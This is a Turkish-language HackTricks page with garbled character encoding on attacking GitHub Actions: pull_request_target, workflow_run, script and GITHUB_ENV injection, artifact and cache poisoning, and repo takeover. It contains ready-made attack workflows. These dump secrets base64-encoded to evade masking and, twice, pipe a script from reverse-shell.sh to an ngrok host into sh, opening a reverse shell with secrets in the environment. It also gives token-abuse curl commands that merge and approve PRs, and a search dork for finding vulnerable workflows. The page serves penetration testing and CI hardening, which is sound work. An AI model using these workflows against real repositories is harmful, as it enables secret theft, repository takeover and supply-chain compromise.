# Github Actions'Ä± KÃ¶tÃ¼ye Kullanma

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi takip edin** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n,** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶ndererek.

</details>
{% endhint %}

## Temel Bilgiler

Bu sayfada ÅŸunlarÄ± bulacaksÄ±nÄ±z:

* Bir saldÄ±rganÄ±n bir Github Action'a eriÅŸmeyi baÅŸardÄ±ÄŸÄ±nda **tÃ¼m etkilerin Ã¶zeti**
* **Bir action'a eriÅŸmenin** farklÄ± yollarÄ±:
* Action'Ä± oluÅŸturmak iÃ§in **izinlere** sahip olmak
* **Pull request** ile ilgili tetikleyicileri kÃ¶tÃ¼ye kullanmak
* **DiÄŸer dÄ±ÅŸ eriÅŸim** tekniklerini kÃ¶tÃ¼ye kullanmak
* Zaten ele geÃ§irilmiÅŸ bir repodan **pivotlama**
* Son olarak, **iÃ§eriden bir action'Ä± kÃ¶tÃ¼ye kullanma sonrasÄ± teknikleri** hakkÄ±nda bir bÃ¶lÃ¼m (belirtilen etkileri yaratmak iÃ§in)

## Etkilerin Ã–zeti

[**Github Actions hakkÄ±nda temel bilgileri kontrol edin**](../basic-github-information.md#github-actions).

EÄŸer **rastgele Github actions Ã§alÄ±ÅŸtÄ±rabilirseniz/kod enjekte edebilirseniz** bir **depo** iÃ§inde, ÅŸunlarÄ± yapabilirsiniz:

* O repo/organizasyondan **gizli bilgileri Ã§almak**.
* Sadece enjekte edebiliyorsanÄ±z, iÅŸ akÄ±ÅŸÄ±nda zaten mevcut olan her ÅŸeyi Ã§alabilirsiniz.
* DiÄŸer platformlara, Ã¶rneÄŸin AWS ve GCP'ye eriÅŸmek iÃ§in **repo ayrÄ±calÄ±klarÄ±nÄ±** kÃ¶tÃ¼ye kullanmak.
* **Ã–zel iÅŸÃ§ilerde kod Ã§alÄ±ÅŸtÄ±rmak** (Ã¶zel iÅŸÃ§iler kullanÄ±lÄ±yorsa) ve oradan pivotlamaya Ã§alÄ±ÅŸmak.
* Depo **kodunu** **Ã¼stÃ¼ne yazmak**.
* Bu, `GITHUB_TOKEN`'Ä±n (varsa) ayrÄ±calÄ±klarÄ±na baÄŸlÄ±dÄ±r.
* **DaÄŸÄ±tÄ±mlarÄ±** ve diÄŸer **artifaktlarÄ±** **ele geÃ§irmek**.
* Kod bir ÅŸey daÄŸÄ±tÄ±yor veya depoluyorsa, bunu deÄŸiÅŸtirebilir ve daha fazla eriÅŸim elde edebilirsiniz.

## GITHUB\_TOKEN

Bu "**gizli**" ( `${{ secrets.GITHUB_TOKEN }}` ve `${{ github.token }}`'den gelen) admin bu seÃ§eneÄŸi etkinleÅŸtirdiÄŸinde verilir:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Bu token, bir **Github UygulamasÄ± tarafÄ±ndan kullanÄ±lacak** olan aynÄ± token'dÄ±r, bu nedenle aynÄ± uÃ§ noktalara eriÅŸebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github, bir repo'nun `GITHUB_TOKEN` kullanarak diÄŸer iÃ§ reposuna eriÅŸmesine **izin veren** bir [**akÄ±ÅŸ**](https://github.com/github/roadmap/issues/74) yayÄ±nlamalÄ±dÄ±r.
{% endhint %}

Bu token'Ä±n olasÄ± **izinlerini** burada gÃ¶rebilirsiniz: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Token'Ä±n **iÅŸ tamamlandÄ±ktan sonra sÃ¼resinin dolduÄŸunu** unutmayÄ±n.\
Bu token'lar ÅŸu ÅŸekilde gÃ¶rÃ¼nÃ¼r: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceÄŸiniz bazÄ± ilginÃ§ ÅŸeyler:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="PR'yi Onayla" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="PR OluÅŸtur" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Dikkat edin ki, birkaÃ§ durumda **Github Actions ortamlarÄ±nda veya gizliliklerde github kullanÄ±cÄ± token'larÄ±nÄ± bulabileceksiniz**. Bu token'lar, size depo ve organizasyon Ã¼zerinde daha fazla yetki verebilir.
{% endhint %}

<details>

<summary>Github Action Ã§Ä±ktÄ±sÄ±nda gizlilikleri listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Gizli anahtarlarla ters shell al</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

DiÄŸer kullanÄ±cÄ±larÄ±n depolarÄ±nda bir Github Token'Ä±na verilen izinleri **loglarÄ± kontrol ederek** kontrol etmek mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Ä°zin Verilen Ä°cra

{% hint style="info" %}
Bu, Github eylemlerini tehlikeye atmanÄ±n en kolay yolu olacaktÄ±r, Ã§Ã¼nkÃ¼ bu durum **organizasyonda yeni bir depo oluÅŸturma** eriÅŸiminiz olduÄŸunu veya **bir depoda yazma yetkisine** sahip olduÄŸunuzu varsayar.

Bu senaryoda iseniz, [Ä°stismar SonrasÄ± Teknikler](./#post-exploitation-techniques-from-inside-an-action) bÃ¶lÃ¼mÃ¼ne gÃ¶z atabilirsiniz.
{% endhint %}

### Depo OluÅŸturma Yoluyla Ä°cra

Bir organizasyonun Ã¼yeleri **yeni depolar oluÅŸturabiliyorsa** ve siz github eylemlerini Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z, **yeni bir depo oluÅŸturup organizasyon seviyesinde ayarlanmÄ±ÅŸ gizli bilgileri Ã§alabilirsiniz**.

### Yeni Bir Dal Ãœzerinden Ä°cra

EÄŸer bir depoda zaten yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir Github Action varsa ve **yeni bir dal oluÅŸturabiliyorsanÄ±z**, onu **deÄŸiÅŸtirebilir**, iÃ§eriÄŸi **yÃ¼kleyebilir** ve ardÄ±ndan **o eylemi yeni dal Ã¼zerinden Ã§alÄ±ÅŸtÄ±rabilirsiniz**. Bu ÅŸekilde **depo ve organizasyon seviyesindeki gizli bilgileri dÄ±ÅŸarÄ± aktarabilirsiniz** (ancak bunlarÄ±n nasÄ±l adlandÄ±rÄ±ldÄ±ÄŸÄ±nÄ± bilmeniz gerekir).

DeÄŸiÅŸtirilmiÅŸ eylemi **manuel olarak,** bir **PR oluÅŸturulduÄŸunda** veya **bazÄ± kodlar itildiÄŸinde** Ã§alÄ±ÅŸtÄ±rÄ±labilir hale getirebilirsiniz (ne kadar dikkat Ã§ekici olmak istediÄŸinize baÄŸlÄ± olarak):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## ForklanmÄ±ÅŸ Ä°cra

{% hint style="info" %}
SaldÄ±rganÄ±n **baÅŸka bir depodaki Github Action'Ä± Ã§alÄ±ÅŸtÄ±rmasÄ±na** izin verebilecek farklÄ± tetikleyiciler vardÄ±r. EÄŸer bu tetiklenebilir eylemler kÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, bir saldÄ±rgan bunlarÄ± tehlikeye atabilir.
{% endhint %}

### `pull_request`

**`pull_request`** iÅŸ akÄ±ÅŸÄ± tetikleyicisi, bazÄ± istisnalarla birlikte her seferinde bir pull request alÄ±ndÄ±ÄŸÄ±nda iÅŸ akÄ±ÅŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±r: varsayÄ±lan olarak, eÄŸer bu **ilk kez** **iÅŸ birliÄŸi yapÄ±yorsanÄ±z**, bazÄ± **bakÄ±cÄ±larÄ±n** iÅŸ akÄ±ÅŸÄ±nÄ±n **Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± onaylamasÄ±** gerekecektir:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**VarsayÄ±lan kÄ±sÄ±tlama** **ilk kez** katkÄ±da bulunanlar iÃ§indir, geÃ§erli bir **hata/yazÄ±m hatasÄ±nÄ± dÃ¼zeltmek** iÃ§in katkÄ±da bulunabilir ve ardÄ±ndan **yeni `pull_request` ayrÄ±calÄ±klarÄ±nÄ±zÄ± kÃ¶tÃ¼ye kullanmak iÃ§in baÅŸka PR'lar gÃ¶nderebilirsiniz**.

**Bunu test ettim ve Ã§alÄ±ÅŸmÄ±yor**: ~~BaÅŸka bir seÃ§enek, projeye katkÄ±da bulunan birinin adÄ±nÄ± taÅŸÄ±yan bir hesap oluÅŸturmak ve hesabÄ±nÄ± silmek olurdu.~~
{% endhint %}

AyrÄ±ca, varsayÄ±lan olarak **yazma izinlerini** ve **gizli verilere eriÅŸimi** hedef depoya engeller, [**belgelere**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) gÃ¶re:

> `GITHUB_TOKEN` hariÃ§, **gizli veriler bir iÅŸ akÄ±ÅŸÄ±** **forklanmÄ±ÅŸ** bir depodan tetiklendiÄŸinde **Ã§alÄ±ÅŸtÄ±rÄ±cÄ±ya geÃ§mez**. **`GITHUB_TOKEN`'Ä±n yalnÄ±zca okuma izinleri** vardÄ±r, **forklanmÄ±ÅŸ depolardan gelen** pull request'lerde.

Bir saldÄ±rgan, Github Action'Ä±n tanÄ±mÄ±nÄ± deÄŸiÅŸtirerek keyfi ÅŸeyler Ã§alÄ±ÅŸtÄ±rabilir ve keyfi eylemler ekleyebilir. Ancak, belirtilen kÄ±sÄ±tlamalar nedeniyle gizli verileri Ã§alamaz veya depoyu Ã¼zerine yazamaz.

{% hint style="danger" %}
**Evet, eÄŸer saldÄ±rgan PR'de tetiklenecek github action'Ä± deÄŸiÅŸtirirse, onun Github Action'Ä± kullanÄ±lacak ve orijinal depodaki deÄŸil!**
{% endhint %}

SaldÄ±rgan ayrÄ±ca Ã§alÄ±ÅŸtÄ±rÄ±lan kodu kontrol ettiÄŸinden, `GITHUB_TOKEN` Ã¼zerinde gizli veriler veya yazma izinleri olmasa bile, bir saldÄ±rgan Ã¶rneÄŸin **kÃ¶tÃ¼ niyetli belgeler yÃ¼kleyebilir**.

### **`pull_request_target`**

**`pull_request_target`** iÅŸ akÄ±ÅŸÄ± tetikleyicisi, hedef depoya **yazma iznine** ve **gizli verilere eriÅŸime** sahiptir (ve izin istemez).

**`pull_request_target`** iÅŸ akÄ±ÅŸÄ± tetikleyicisinin **temel baÄŸlamda** Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± ve PR tarafÄ±ndan verilen baÄŸlamda Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± unutmayÄ±n (**gÃ¼venilmeyen kodu Ã§alÄ±ÅŸtÄ±rmamak iÃ§in**). `pull_request_target` hakkÄ±nda daha fazla bilgi iÃ§in [**belgelere**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target) bakÄ±n.\
AyrÄ±ca, bu Ã¶zel tehlikeli kullanÄ±m hakkÄ±nda daha fazla bilgi iÃ§in bu [**github blog yazÄ±sÄ±nÄ±**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) kontrol edin.

**Ã‡alÄ±ÅŸtÄ±rÄ±lan iÅŸ akÄ±ÅŸÄ±nÄ±n** **temelde** tanÄ±mlandÄ±ÄŸÄ± ve **PR'de** deÄŸil olduÄŸu iÃ§in **`pull_request_target`** kullanmanÄ±n **gÃ¼venli** olduÄŸu gÃ¶rÃ¼nebilir, ancak bunun **gÃ¼venli olmadÄ±ÄŸÄ± birkaÃ§ durum vardÄ±r**.

Ve bu, **gizli verilere eriÅŸim** saÄŸlayacaktÄ±r.

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) tetikleyicisi, bir iÅŸ akÄ±ÅŸÄ± tamamlandÄ±ÄŸÄ±nda, `istekli` veya `devam eden` olduÄŸunda baÅŸka bir iÅŸ akÄ±ÅŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmaya olanak tanÄ±r.

Bu Ã¶rnekte, bir iÅŸ akÄ±ÅŸÄ±, ayrÄ± "Testleri Ã‡alÄ±ÅŸtÄ±r" iÅŸ akÄ±ÅŸÄ± tamamlandÄ±ktan sonra Ã§alÄ±ÅŸacak ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
AyrÄ±ca, belgelerde belirtildiÄŸi gibi: `workflow_run` olayÄ±yla baÅŸlatÄ±lan iÅŸ akÄ±ÅŸÄ±, **Ã¶nceki iÅŸ akÄ±ÅŸÄ±** Ã§alÄ±ÅŸtÄ±rÄ±lmamÄ±ÅŸ olsa bile **gizli bilgilere eriÅŸebilir ve token yazabilir**.

Bu tÃ¼r bir iÅŸ akÄ±ÅŸÄ±, **`pull_request`** veya **`pull_request_target`** aracÄ±lÄ±ÄŸÄ±yla bir dÄ±ÅŸ kullanÄ±cÄ± tarafÄ±ndan **tetiklenebilen** bir **iÅŸ akÄ±ÅŸÄ±na** **baÄŸlÄ±ysa** saldÄ±rÄ±ya uÄŸrayabilir. BirkaÃ§ savunmasÄ±z Ã¶rnek [**bu blogda**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**bulunabilir.** Ä°lk Ã¶rnek, **`workflow_run`** tetiklenen iÅŸ akÄ±ÅŸÄ±nÄ±n saldÄ±rganÄ±n kodunu indirmesidir: `${{ github.event.pull_request.head.sha }}`\
Ä°kinci Ã¶rnek, **gÃ¼venilmeyen** koddan **`workflow_run`** iÅŸ akÄ±ÅŸÄ±na bir **artifact** **geÃ§irerek** ve bu artifact'Ä±n iÃ§eriÄŸini **RCE'ye karÅŸÄ± savunmasÄ±z hale getirecek** bir ÅŸekilde kullanmaktÄ±r.

### `workflow_call`

TODO

TODO: `pull_request`'tan Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda kullanÄ±lan/indirilen kodun orijinalden mi yoksa fork edilmiÅŸ PR'den mi olduÄŸunu kontrol et

## Forked Execution'Ä± KÃ¶tÃ¼ye Kullanma

Bir dÄ±ÅŸ saldÄ±rganÄ±n bir github iÅŸ akÄ±ÅŸÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmasÄ±nÄ± saÄŸlamak iÃ§in tÃ¼m yollarÄ± belirttik, ÅŸimdi bu Ã§alÄ±ÅŸtÄ±rmalarÄ±n, kÃ¶tÃ¼ yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nda, nasÄ±l kÃ¶tÃ¼ye kullanÄ±labileceÄŸine bakalÄ±m:

### GÃ¼venilmeyen checkout Ã§alÄ±ÅŸtÄ±rmasÄ±

**`pull_request`** durumunda, iÅŸ akÄ±ÅŸÄ± **PR'nin baÄŸlamÄ±nda** Ã§alÄ±ÅŸtÄ±rÄ±lacak (yani **kÃ¶tÃ¼ niyetli PR kodunu** Ã§alÄ±ÅŸtÄ±racak), ancak birinin **Ã¶nce bunu yetkilendirmesi** gerekiyor ve bazÄ± [kÄ±sÄ±tlamalarla](./#pull_request) Ã§alÄ±ÅŸacak.

**`pull_request_target` veya `workflow_run`** kullanan bir iÅŸ akÄ±ÅŸÄ±nda, **`pull_request_target` veya `pull_request`** aracÄ±lÄ±ÄŸÄ±yla tetiklenebilen bir iÅŸ akÄ±ÅŸÄ±na baÄŸlÄ±ysa, orijinal repo kodu Ã§alÄ±ÅŸtÄ±rÄ±lacak, bu nedenle **saldÄ±rgan Ã§alÄ±ÅŸtÄ±rÄ±lan kodu kontrol edemez**.

{% hint style="danger" %}
Ancak, eÄŸer **action** aÃ§Ä±k bir **PR checkout**'a sahipse ve bu **PR'den kod alÄ±yorsa** (ve temelden deÄŸilse), saldÄ±rganÄ±n kontrolÃ¼ndeki kodu kullanacaktÄ±r. Ã–rneÄŸin (PR kodunun indirildiÄŸi 12. satÄ±ra bakÄ±n):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># GÃœVENLÄ° DEÄÄ°L. Sadece bir Ã¶rnek olarak verilmiÅŸtir.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
TeÅŸekkÃ¼rler!
</code></pre>

Potansiyel olarak **gÃ¼venilmeyen kod, `npm install` veya `npm build` sÄ±rasÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lmaktadÄ±r** Ã§Ã¼nkÃ¼ derleme betikleri ve referans verilen **paketler PR yazarÄ±nÄ±n kontrolÃ¼ndedir**.

{% hint style="warning" %}
SavunmasÄ±z eylemleri aramak iÃ§in bir github dork'u: `event.pull_request pull_request_target extension:yml` ancak, eylem gÃ¼vensiz yapÄ±landÄ±rÄ±lmÄ±ÅŸ olsa bile, iÅŸlerin gÃ¼venli bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in farklÄ± yollar vardÄ±r (Ã¶rneÄŸin, PR'yi oluÅŸturan aktÃ¶r hakkÄ±nda koÅŸullu ifadeler kullanmak).
{% endhint %}

### BaÄŸlam Script EnjeksiyonlarÄ± <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Belirli [**github baÄŸlamlarÄ±**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) olduÄŸunu unutmayÄ±n, bu baÄŸlamlarÄ±n deÄŸerleri **PR'yi oluÅŸturan kullanÄ±cÄ±** tarafÄ±ndan **kontrol edilmektedir**. EÄŸer github action bu **verileri herhangi bir ÅŸeyi Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±yorsa**, bu **rastgele kod Ã§alÄ±ÅŸtÄ±rmaya** yol aÃ§abilir:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Script Enjeksiyonu** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Belgelerden: Bir iÅŸ akÄ±ÅŸÄ± iÅŸinde herhangi bir sonraki adÄ±mlara **bir ortam deÄŸiÅŸkeni** saÄŸlamak iÃ§in ortam deÄŸiÅŸkenini tanÄ±mlayarak veya gÃ¼ncelleyerek ve bunu **`GITHUB_ENV`** ortam dosyasÄ±na yazarak yapabilirsiniz.

EÄŸer bir saldÄ±rgan bu **env** deÄŸiÅŸkeninin iÃ§ine **herhangi bir deÄŸer** enjekte edebilirse, **LD\_PRELOAD** veya **NODE\_OPTIONS** gibi sonraki adÄ±mlarda kod Ã§alÄ±ÅŸtÄ±rabilecek env deÄŸiÅŸkenlerini enjekte edebilir.

Ã–rneÄŸin ([**bu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ve [**bu**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), **`GITHUB_ENV`** env deÄŸiÅŸkeninin iÃ§eriÄŸini depolamak iÃ§in yÃ¼klenen bir artifact'a gÃ¼venen bir iÅŸ akÄ±ÅŸÄ±nÄ± hayal edin. Bir saldÄ±rgan bunu tehlikeye atmak iÃ§in ÅŸÃ¶yle bir ÅŸey yÃ¼kleyebilir:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### SavunmasÄ±z ÃœÃ§Ã¼ncÃ¼ Taraf Github Eylemleri

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**bu blog yazÄ±sÄ±nda**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) belirtildiÄŸi gibi, bu Github Action farklÄ± iÅŸ akÄ±ÅŸlarÄ±ndan ve hatta depolardan artifact'lara eriÅŸim saÄŸlar.

Sorun ÅŸu ki, eÄŸer **`path`** parametresi ayarlanmamÄ±ÅŸsa, artifact mevcut dizine Ã§Ä±karÄ±lÄ±r ve daha sonra iÅŸ akÄ±ÅŸÄ±nda kullanÄ±labilecek veya Ã§alÄ±ÅŸtÄ±rÄ±labilecek dosyalarÄ± geÃ§ersiz kÄ±labilir. Bu nedenle, eÄŸer Artifact savunmasÄ±zsa, bir saldÄ±rgan bunu diÄŸer iÅŸ akÄ±ÅŸlarÄ±nÄ± tehlikeye atmak iÃ§in kÃ¶tÃ¼ye kullanabilir.

SavunmasÄ±z bir iÅŸ akÄ±ÅŸÄ± Ã¶rneÄŸi:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu iÅŸ akÄ±ÅŸÄ± ile saldÄ±rÄ±ya uÄŸrayabilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## DiÄŸer Harici EriÅŸim

### SilinmiÅŸ Namespace Repo Ele GeÃ§irme

EÄŸer bir hesap adÄ±nÄ± deÄŸiÅŸtirirse, baÅŸka bir kullanÄ±cÄ± bir sÃ¼re sonra o isimle bir hesap kaydedebilir. EÄŸer bir depo **isim deÄŸiÅŸikliÄŸinden Ã¶nce 100 yÄ±ldÄ±zdan azsa**, Github, aynÄ± isimle yeni kayÄ±tlÄ± kullanÄ±cÄ±nÄ±n **silinmiÅŸ olanla aynÄ± isimde bir depo oluÅŸturmasÄ±na** izin verecektir.

{% hint style="danger" %}
Bu nedenle, eÄŸer bir iÅŸlem var olmayan bir hesaptan bir depo kullanÄ±yorsa, bir saldÄ±rganÄ±n o hesabÄ± oluÅŸturup iÅŸlemi tehlikeye atmasÄ± hala mÃ¼mkÃ¼n olabilir.
{% endhint %}

EÄŸer diÄŸer depolar **bu kullanÄ±cÄ± depolarÄ±ndan baÄŸÄ±mlÄ±lÄ±klar kullanÄ±yorsa**, bir saldÄ±rgan bunlarÄ± ele geÃ§irebilir. Ä°ÅŸte daha kapsamlÄ± bir aÃ§Ä±klama: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivotlama

{% hint style="info" %}
Bu bÃ¶lÃ¼mde, ilk depoda bir tÃ¼r eriÅŸimimiz olduÄŸunu varsayarak **bir depodan diÄŸerine geÃ§iÅŸ yapmamÄ±zÄ±** saÄŸlayacak tekniklerden bahsedeceÄŸiz (Ã¶nceki bÃ¶lÃ¼me bakÄ±n).
{% endhint %}

### Ã–nbellek Zehirleme

AynÄ± dalda **iÅŸ akÄ±ÅŸlarÄ± arasÄ±nda bir Ã¶nbellek** tutulur. Bu, eÄŸer bir saldÄ±rgan **bir paketi tehlikeye atarsa** ve bu paket Ã¶nbelleÄŸe kaydedilip **daha ayrÄ±calÄ±klÄ±** bir iÅŸ akÄ±ÅŸÄ± tarafÄ±ndan **indirilip** Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rsa, o iÅŸ akÄ±ÅŸÄ±nÄ± da **tehlikeye atabileceÄŸi** anlamÄ±na gelir.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Artefakt Zehirleme

Ä°ÅŸ akÄ±ÅŸlarÄ± **diÄŸer iÅŸ akÄ±ÅŸlarÄ±ndan ve hatta depolardan artefaktlar** kullanabilir, eÄŸer bir saldÄ±rgan **bir artefakt yÃ¼kleyen** Github Action'Ä± **tehlikeye atmayÄ±** baÅŸarÄ±rsa ve bu artefakt baÅŸka bir iÅŸ akÄ±ÅŸÄ± tarafÄ±ndan daha sonra kullanÄ±lÄ±rsa, o zaman **diÄŸer iÅŸ akÄ±ÅŸlarÄ±nÄ± da tehlikeye atabilir**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Bir Ä°ÅŸlemden Sonra SÃ¶mÃ¼rÃ¼

### OIDC Ãœzerinden AWS ve GCP'ye EriÅŸim

AÅŸaÄŸÄ±daki sayfalara gÃ¶z atÄ±n:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Gizli Bilgilere EriÅŸim <a href="#accessing-secrets" id="accessing-secrets"></a>

EÄŸer bir script'e iÃ§erik enjekte ediyorsanÄ±z, gizli bilgilere nasÄ±l eriÅŸebileceÄŸinizi bilmek ilginÃ§tir:

* EÄŸer gizli bilgi veya token bir **Ã§evre deÄŸiÅŸkenine** ayarlandÄ±ysa, **`printenv`** kullanarak Ã§evre Ã¼zerinden doÄŸrudan eriÅŸilebilir.

<details>

<summary>Github Action Ã§Ä±ktÄ±sÄ±nda gizli bilgileri listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Gizli anahtarlarla ters shell al</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
